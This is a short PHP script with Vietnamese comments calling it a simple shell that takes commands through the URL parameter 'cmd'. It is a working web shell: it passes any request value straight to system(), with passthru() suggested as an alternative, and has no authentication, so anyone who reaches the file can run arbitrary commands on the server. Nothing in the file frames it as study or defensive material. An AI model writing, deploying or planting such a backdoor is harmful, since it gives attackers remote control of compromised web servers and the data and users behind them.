<?php
    // shell đơn giản nhận lệnh qua tham số 'cmd' trên URL
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd); // Hoặc dùng passthru($cmd);
        echo "</pre>";
        die;
    }
?>